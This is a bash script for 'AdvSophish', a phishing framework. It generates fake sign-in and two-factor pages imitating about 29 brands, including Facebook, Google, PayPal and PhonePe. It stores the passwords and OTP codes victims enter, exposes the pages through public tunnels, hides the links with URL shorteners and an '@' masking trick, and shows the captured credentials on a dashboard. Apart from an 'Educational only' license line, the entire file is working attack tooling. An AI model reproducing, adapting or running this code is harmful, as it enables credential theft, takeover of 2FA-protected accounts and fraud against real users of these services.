#!/bin/bash

##   AdvSophish - Advanced Phishing Framework
##   Author: mahi-cyberaware
##   Version: 3.2.0
##   GitHub: https://github.com/mahi-cyberaware/AdvSophish

set -euo pipefail
trap 'kill_pid; reset_color' INT TERM EXIT

# ------------------------------- Config ----------------------------------
HOST='127.0.0.1'
PORT='8080'
DASHBOARD_PORT='8081'
MASK_URL=""   # Optional: set to "https://your-mask.com" to enable masking

# Colors
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
RESET="$(printf '\e[0m\n')"

BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
mkdir -p "$BASE_DIR/.server/www" "$BASE_DIR/auth" "$BASE_DIR/dashboard/assets"

# ------------------------------- Helper Functions -------------------------
reset_color() { tput sgr0; tput op 2>/dev/null || true; }
kill_pid() { for proc in php cloudflared loclx; do pkill -f "$proc" 2>/dev/null; done; }

banner() {
    clear
    cat <<-EOF
		${ORANGE}    _    _     _       _____ _     _     _     
		${ORANGE}   / \  | |   | |     |_   _| |__ (_)___| |__  
		${ORANGE}  / _ \ | |   | |       | | | '_ \| / __| '_ \ 
		${ORANGE} / ___ \| |___| |___    | | | | | | \__ \ | | |
		${ORANGE}/_/   \_\_____|_____|   |_| |_| |_|_|___/_| |_|
		${ORANGE}                                              
		${ORANGE}                AdvSophish ${RED}Version : 3.2.0

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Advanced Phishing Framework - mahi-cyberaware${RESET}
	EOF
}

# ------------------------------- Dependency Management --------------------
dependencies() {
    echo -e "\n${GREEN}[+]${CYAN} Checking dependencies..."
    local pkgs=(php curl unzip)
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &>/dev/null; then
            echo -e "${GREEN}[+]${ORANGE} Installing $pkg..."
            if command -v pkg &>/dev/null; then pkg install "$pkg" -y
            elif command -v apt &>/dev/null; then sudo apt install "$pkg" -y
            elif command -v pacman &>/dev/null; then sudo pacman -S "$pkg" --noconfirm
            elif command -v dnf &>/dev/null; then sudo dnf install "$pkg" -y
            else echo -e "${RED}[-] No package manager. Install $pkg manually.${RESET}"; exit 1
            fi
        fi
    done
    echo -e "${GREEN}[+] All dependencies OK.${RESET}"
}

install_cloudflared() {
    [[ -x ".server/cloudflared" ]] && return
    echo -e "\n${GREEN}[+]${CYAN} Installing Cloudflared..."
    arch=$(uname -m)
    case $arch in
        armv7l|armv8l) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        aarch64)       url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        x86_64)        url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        *)             url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
    esac
    curl -L --silent --insecure --fail --retry 2 -o ".server/cloudflared" "$url"
    chmod +x ".server/cloudflared"
}

install_localxpose() {
    [[ -x ".server/loclx" ]] && return
    echo -e "\n${GREEN}[+]${CYAN} Installing LocalXpose..."
    arch=$(uname -m)
    case $arch in
        armv7l|armv8l) url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" ;;
        aarch64)       url="https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" ;;
        x86_64)        url="https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" ;;
        *)             url="https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" ;;
    esac
    curl -L --silent --insecure --fail --retry 2 -o ".server/loclx.zip" "$url"
    unzip -qq ".server/loclx.zip" -d ".server/"
    mv ".server/loclx"* ".server/loclx" 2>/dev/null
    chmod +x ".server/loclx"
    rm -f ".server/loclx.zip"
}

# ------------------------------- Auto Template Generator (Full Sites) -----
generate_all_sites() {
    echo -e "${GREEN}[+] Generating all 35+ phishing templates with original logos...${RESET}"
    
    # Site definitions: (folder, display name, brand color, logo fontawesome, bg style)
    declare -A SITE_STYLES
    SITE_STYLES["tiktok"]="TikTok|#010101|fab fa-tiktok"
    SITE_STYLES["facebook_tfo"]="Facebook|#1877f2|fab fa-facebook"
    SITE_STYLES["instagram_tfo"]="Instagram|#e4405f|fab fa-instagram"
    SITE_STYLES["ubereats_tfo"]="Uber Eats|#06c167|fas fa-utensils"
    SITE_STYLES["aijo_tfo"]="Aijo|#ff9900|fas fa-ad"
    SITE_STYLES["google_tfo"]="Google|#4285f4|fab fa-google"
    SITE_STYLES["twitch_tfo"]="Twitch|#9146ff|fab fa-twitch"
    SITE_STYLES["netflix_tfo"]="Netflix|#e50914|fab fa-netflix"
    SITE_STYLES["instagram_followers"]="Instagram Followers|#e4405f|fab fa-instagram"
    SITE_STYLES["amazon_tfo"]="Amazon|#ff9900|fab fa-amazon"
    SITE_STYLES["whatsapp_tfo"]="WhatsApp|#25d366|fab fa-whatsapp"
    SITE_STYLES["linkedin_tfo"]="LinkedIn|#0077b5|fab fa-linkedin"
    SITE_STYLES["hotstar_tfo"]="Hotstar|#ff5e00|fas fa-tv"
    SITE_STYLES["spotify_tfo"]="Spotify|#1db954|fab fa-spotify"
    SITE_STYLES["github_tfo"]="GitHub|#333|fab fa-github"
    SITE_STYLES["mobikwik_tfo"]="Mobikwik|#ff6200|fas fa-wallet"
    SITE_STYLES["zomato_tfo"]="Zomato|#cb202d|fas fa-utensils"
    SITE_STYLES["phonepay_tfo"]="PhonePe|#5f259f|fas fa-phone-alt"
    SITE_STYLES["paypal_tfo"]="PayPal|#00457c|fab fa-paypal"
    SITE_STYLES["telegram_tfo"]="Telegram|#26a5e4|fab fa-telegram"
    SITE_STYLES["twitter_tfo"]="Twitter|#1da1f2|fab fa-twitter"
    SITE_STYLES["flipcart_tfo"]="Flipkart|#2874f0|fab fa-opencart"
    SITE_STYLES["wordpress"]="WordPress|#21759b|fab fa-wordpress"
    SITE_STYLES["snapchat_tfo"]="Snapchat|#fffc00|fab fa-snapchat-ghost"
    SITE_STYLES["protonmail_tfo"]="ProtonMail|#6d4aff|fas fa-envelope"
    SITE_STYLES["stackoverflow"]="StackOverflow|#f48024|fab fa-stack-overflow"
    SITE_STYLES["ebay_tfo"]="eBay|#e53238|fab fa-ebay"
    SITE_STYLES["pinterest"]="Pinterest|#bd081c|fab fa-pinterest"
    SITE_STYLES["cryptocurrency"]="Crypto|#f2a900|fab fa-bitcoin"

    for site_id in "${!SITE_STYLES[@]}"; do
        IFS='|' read -r name color icon <<< "${SITE_STYLES[$site_id]}"
        local site_dir=".sites/$site_id"
        [[ -d "$site_dir" ]] && continue
        mkdir -p "$site_dir"
        
        # Create a unified style.css with Font Awesome + site branding
        cat > "$site_dir/style.css" <<-CSS
		* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
		body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
		.card { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 400px; padding: 20px; text-align: center; }
		.logo { font-size: 48px; color: $color; margin-bottom: 20px; }
		h2 { color: $color; margin-bottom: 20px; }
		input { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
		button { background: $color; border: none; color: white; font-size: 20px; font-weight: bold; padding: 12px; border-radius: 6px; width: 100%; cursor: pointer; margin-top: 10px; }
		button:hover { opacity: 0.9; }
		.footer { margin-top: 20px; color: #777; font-size: 14px; }
		CSS

        # Login page (index.html)
        cat > "$site_dir/index.html" <<-HTML
		<!DOCTYPE html>
		<html>
		<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>$name - Sign In</title>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
		<link rel="stylesheet" href="style.css">
		</head>
		<body>
		<div class="card">
		    <div class="logo"><i class="$icon"></i></div>
		    <h2>Sign in to $name</h2>
		    <form method="POST" action="login.php">
		        <input type="text" name="username" placeholder="Email or Phone" required autofocus>
		        <input type="password" name="password" placeholder="Password" required>
		        <button type="submit">Log In</button>
		    </form>
		    <div class="footer">Forgot password? · Create account</div>
		</div>
		</body>
		</html>
		HTML

        # login.php
        cat > "$site_dir/login.php" <<-PHP
		<?php
		\$data = "$site_id|" . \$_POST['username'] . "|" . \$_POST['password'] . "|" . date('Y-m-d H:i:s');
		file_put_contents('../../auth/usernames.dat', \$data . PHP_EOL, FILE_APPEND);
		header('Location: otp.html');
		exit;
		PHP

        # OTP page (looks like 2FA step)
        cat > "$site_dir/otp.html" <<-HTML
		<!DOCTYPE html>
		<html>
		<head><meta charset="UTF-8"><title>Two‑Factor Authentication</title>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
		<link rel="stylesheet" href="style.css">
		</head>
		<body>
		<div class="card">
		    <div class="logo"><i class="fas fa-shield-alt"></i></div>
		    <h2>Two‑Factor Authentication</h2>
		    <p style="margin-bottom: 15px;">Enter the 6-digit code from your authenticator app.</p>
		    <form method="POST" action="otp.php">
		        <input type="text" name="otp" placeholder="000000" required maxlength="6">
		        <button type="submit">Verify</button>
		    </form>
		</div>
		</body>
		</html>
		HTML

        # otp.php
        cat > "$site_dir/otp.php" <<-PHP
		<?php
		\$data = "$site_id|" . \$_POST['otp'] . "|" . date('Y-m-d H:i:s');
		file_put_contents('../../auth/otp.dat', \$data . PHP_EOL, FILE_APPEND);
		// Redirect to real website
		\$redirect = "https://www.google.com";
		header("Location: \$redirect");
		exit;
		PHP

        # IP logger (ip.php)
        cat > "$site_dir/ip.php" <<-'PHP'
		<?php
		$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
		file_put_contents('ip.txt', "IP: $ip - " . date('Y-m-d H:i:s') . PHP_EOL, FILE_APPEND);
		?>
		PHP

        echo -e "${GREEN}[✓] Generated $site_id ($name)${RESET}"
    done
}

# ------------------------------- Phishing Engine --------------------------
setup_site() {
    local site_id="$1"
    generate_all_sites   # ensures all exist
    rm -rf ".server/www"/*
    cp -rf ".sites/$site_id"/* ".server/www/"
    cd ".server/www"
    php -S "$HOST":"$PORT" >/dev/null 2>&1 &
    cd "$BASE_DIR"
    echo -e "\n${GREEN}[+] PHP server running on http://$HOST:$PORT${RESET}"
}

capture_data() {
    local creds_file="$BASE_DIR/auth/usernames.dat"
    local otp_file="$BASE_DIR/auth/otp.dat"
    echo -e "\n${GREEN}[+]${CYAN} Waiting for victim... (Ctrl+C to stop)${RESET}"
    tail -f "$creds_file" "$otp_file" 2>/dev/null | while read line; do
        if [[ "$line" =~ ^[a-z_]+| ]]; then
            echo -e "${RED}[!]${GREEN} Capture: ${BLUE}$line${RESET}"
        fi
    done
}

# ------------------------------- Obfuscation -------------------------------
obfuscate_url() {
    local long_url="$1"
    local short_url=$(curl -s "https://is.gd/create.php?format=simple&url=$long_url" 2>/dev/null)
    [[ -z "$short_url" || "$short_url" == *"Error"* ]] && short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$long_url" 2>/dev/null)
    [[ -z "$short_url" ]] && short_url="$long_url"
    
    echo -e "${GREEN}Original: ${CYAN}$long_url${RESET}"
    echo -e "${GREEN}Shortened: ${CYAN}$short_url${RESET}"
    if [[ -n "$MASK_URL" ]]; then
        local masked="${MASK_URL}@${short_url#https://}"
        echo -e "${GREEN}Masked: ${CYAN}$masked${RESET}"
    fi
}

# ------------------------------- Tunnels -----------------------------------
start_cloudflared() {
    local site="$1" port="$2"
    setup_site "$site"
    echo -e "\n${GREEN}[+]${CYAN} Launching Cloudflared..."
    ./.server/cloudflared tunnel --url "$HOST:$port" --logfile ".server/.cld.log" >/dev/null 2>&1 &
    sleep 8
    url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" | head -1)
    [[ -z "$url" ]] && { echo -e "${RED}[-] Cloudflared failed.${RESET}"; exit 1; }
    obfuscate_url "$url"
    capture_data
}

start_localxpose() {
    local site="$1" port="$2"
    setup_site "$site"
    echo -e "\n${GREEN}[+]${CYAN} Launching LocalXpose..."
    ./.server/loclx tunnel --raw-mode http --https-redirect -t "$HOST:$port" > ".server/.loclx" 2>&1 &
    sleep 12
    url=$(grep -o '[0-9a-zA-Z.]*\.loclx.io' ".server/.loclx" | head -1)
    [[ -z "$url" ]] && { echo -e "${RED}[-] LocalXpose failed.${RESET}"; exit 1; }
    obfuscate_url "https://$url"
    capture_data
}

start_localhost() {
    local site="$1" port="$2"
    setup_site "$site"
    obfuscate_url "http://$HOST:$port"
    capture_data
}

# ------------------------------- Dashboard ----------------------------------
start_dashboard() {
    # Create dashboard files if missing
    if [[ ! -f "dashboard/index.php" ]]; then
        mkdir -p dashboard
        cat > "dashboard/index.php" <<-'DASH'
<?php
$creds_file = '../auth/usernames.dat';
$otp_file = '../auth/otp.dat';
$creds = [];
$otps = [];
if (file_exists($creds_file)) {
    $lines = file($creds_file, FILE_IGNORE_NEW_LINES);
    foreach ($lines as $line) {
        $d = explode('|', $line);
        if (count($d)>=4) $creds[] = ['site'=>$d[0],'user'=>$d[1],'pass'=>$d[2],'time'=>$d[3]];
    }
}
if (file_exists($otp_file)) {
    $lines = file($otp_file, FILE_IGNORE_NEW_LINES);
    foreach ($lines as $line) {
        $d = explode('|', $line);
        if (count($d)>=3) $otps[] = ['site'=>$d[0],'otp'=>$d[1],'time'=>$d[2]];
    }
}
if (isset($_GET['del'])) {
    if ($_GET['del']=='creds') file_put_contents($creds_file,'');
    if ($_GET['del']=='otp') file_put_contents($otp_file,'');
    header('Location: index.php'); exit;
}
?><!DOCTYPE html>
<html><head><title>AdvSophish Dashboard</title><style>
body{background:#0a0e1a;color:#eee;font-family:monospace;padding:20px;}
.container{max-width:1400px;margin:auto;background:#161c2c;border-radius:12px;padding:20px;}
h1{color:#ff9800;}
table{width:100%;border-collapse:collapse;margin-top:20px;}
th,td{padding:10px;text-align:left;border-bottom:1px solid #2a3246;}
th{background:#0f1422;}
.btn{background:#2a3a5a;color:white;padding:8px 16px;text-decoration:none;border-radius:6px;margin-right:10px;}
.btn-danger{background:#a12a2a;}
</style></head>
<body><div class=container><h1>AdvSophish Dashboard</h1>
<div><a class=btn href="?del=creds">Clear Credentials</a><a class=btn href="?del=otp">Clear OTPs</a></div>
<h2>Credentials (<?=count($creds)?>)</h2><tr><tr><th>Site</th><th>Username</th><th>Password</th><th>Time</th></tr>
<?php foreach($creds as $c) echo "<tr><td>{$c['site']}</td><td>{$c['user']}</td><td>{$c['pass']}</td><td>{$c['time']}</td></tr>"; ?>
</table><h2>OTPs (<?=count($otps)?>)</h2><table><tr><th>Site</th><th>OTP</th><th>Time</th></tr>
<?php foreach($otps as $o) echo "<tr><td>{$o['site']}</td><td>{$o['otp']}</td><td>{$o['time']}</td></tr>"; ?>
</table></div></body></html>
DASH
    fi
    echo -e "\n${GREEN}[+] Starting dashboard on port $DASHBOARD_PORT ...${RESET}"
    cd "dashboard"
    php -S "$HOST":"$DASHBOARD_PORT" >/dev/null 2>&1 &
    cd "$BASE_DIR"
    echo -e "${GREEN}[+] Dashboard URL: ${CYAN}http://$HOST:$DASHBOARD_PORT${RESET}"
    echo -e "${GREEN}[+] Press Ctrl+C to stop dashboard.${RESET}"
    wait
}

# ------------------------------- Main Menu ----------------------------------
# List of all 35 sites (order from your image)
SITE_IDS=(
    tiktok facebook_tfo instagram_tfo ubereats_tfo aijo_tfo google_tfo
    twitch_tfo netflix_tfo instagram_followers amazon_tfo whatsapp_tfo
    linkedin_tfo hotstar_tfo spotify_tfo github_tfo mobikwik_tfo
    zomato_tfo phonepay_tfo paypal_tfo telegram_tfo twitter_tfo
    flipcart_tfo wordpress snapchat_tfo protonmail_tfo stackoverflow
    ebay_tfo pinterest cryptocurrency
)

show_menu() {
    echo -e "\n${ORANGE}Available Phishing Targets:${RESET}"
    local i=1
    for id in "${SITE_IDS[@]}"; do
        printf "${RED}[${WHITE}%02d${RED}]${ORANGE} %-18s" "$i" "$(echo $id | tr '_' ' ' | sed 's/tfo//g' | sed 's/_/ /g' | awk '{for(j=1;j<=NF;j++) $j=toupper(substr($j,1,1)) tolower(substr($j,2))}1')"
        if (( i % 3 == 0 )); then echo; fi
        ((i++))
    done
    echo -e "\n${RED}[${WHITE}88${RED}]${ORANGE} Dashboard"
    echo -e "${RED}[${WHITE}99${RED}]${ORANGE} About"
    echo -e "${RED}[${WHITE}00${RED}]${ORANGE} Exit"
}

main_menu() {
    banner
    show_menu
    read -p "${GREEN}[+] Choose option: ${BLUE}" choice
    if [[ "$choice" == "00" ]]; then
        echo -e "\n${GREEN}Exiting...${RESET}"; kill_pid; exit 0
    elif [[ "$choice" == "88" ]]; then
        start_dashboard; main_menu; return
    elif [[ "$choice" == "99" ]]; then
        banner; echo -e "${CYAN}Author: mahi-cyberaware\nGitHub: https://github.com/mahi-cyberaware/AdvSophish\nVersion: 3.2.0\nLicense: Educational only${RESET}"; read -n1; main_menu; return
    elif [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#SITE_IDS[@]} )); then
        SELECTED_SITE="${SITE_IDS[$((choice-1))]}"
        tunnel_menu
    else
        echo -e "${RED}Invalid option${RESET}"; sleep 1; main_menu
    fi
}

tunnel_menu() {
    echo -e "\n${RED}[${WHITE}01${RED}]${ORANGE} Localhost"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose"
    read -p "${GREEN}[+] Tunnel: ${BLUE}" tun
    read -p "${GREEN}[+] Custom port? (y/N): ${BLUE}" custom
    local port=$PORT
    if [[ $custom =~ ^[Yy]$ ]]; then
        read -p "Enter port (1024-65535): " port
        [[ $port -lt 1024 || $port -gt 65535 ]] && port=8080
    fi
    case $tun in
        1|01) start_localhost "$SELECTED_SITE" "$port" ;;
        2|02) install_cloudflared; start_cloudflared "$SELECTED_SITE" "$port" ;;
        3|03) install_localxpose; start_localxpose "$SELECTED_SITE" "$port" ;;
        *) echo -e "${RED}Invalid${RESET}"; tunnel_menu ;;
    esac
}

# ------------------------------- Start -------------------------------------
kill_pid
dependencies
generate_all_sites   # creates all templates on first run (no changes needed)
main_menu
